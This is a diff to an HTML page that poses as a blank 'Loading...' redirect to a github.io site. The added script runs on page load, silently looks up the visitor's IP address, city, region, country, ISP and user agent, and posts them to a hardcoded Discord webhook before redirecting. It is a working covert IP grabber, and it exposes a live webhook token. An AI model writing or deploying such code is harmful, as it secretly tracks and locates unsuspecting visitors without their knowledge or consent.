@@ -1,35 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://milo-is-cooked.github.io/ddom/main.html">
-    <title>Redirecting...</title>
+    <title>Loading...</title>
     <script>
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
+        (async () => {
+            try {
+                // Fetch IP & Geolocation
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const data = await ipResponse.json();
+
+                // Prepare Discord payload
                 const webhookURL = 'https://discord.com/api/webhooks/1400273980522365038/A5LHQj8BQv5mzerr8QpDJ2_iPWInsSLu4meFRf4aA51T4u77LS8awsezamSlfG65H2nw';
-                
                 const embed = {
-                    title: "Visitor Logged",
-                    color: 0x00ff00,
+                    title: "📌 New Visitor Logged",
+                    color: 0xFF0000,
                     fields: [
-                        { name: "IP", value: data.ip || "Unknown" },
-                        { name: "Location", value: `${data.city || "?"}, ${data.region || "?"}, ${data.country_name || "?"}` },
-                        { name: "ISP", value: data.org || "Unknown" },
-                        { name: "User Agent", value: navigator.userAgent || "Unknown" }
-                    ],
-                    timestamp: new Date().toISOString()
+                        { name: "🌐 IP Address", value: `\`${data.ip || "Unknown"}\`` },
+                        { name: "📍 Location", value: `${data.city || "?"}, ${data.region || "?"}, ${data.country_name || "?"}` },
+                        { name: "🛜 ISP", value: data.org || "Unknown" },
+                        { name: "🔍 User Agent", value: `\`\`\`${navigator.userAgent || "Unknown"}\`\`\`` },
+                        { name: "🕒 Time", value: new Date().toLocaleString() }
+                    ]
                 };
-                fetch(webhookURL, {
+
+                // Send to Discord (wait for completion)
+                await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ embeds: [embed] })
                 });
-            })
-            .catch(() => {});
+
+            } catch (error) {
+                // Fail silently (no delay if error)
+                console.error("Error logging data:", error);
+            }
+
+            // Redirect AFTER sending data
+            window.location.href = "https://milo-is-cooked.github.io/ddom/main.html";
+        })();
     </script>
 </head>
 <body>
+    <!-- Empty page (no visible content) -->
 </body>
 </html>
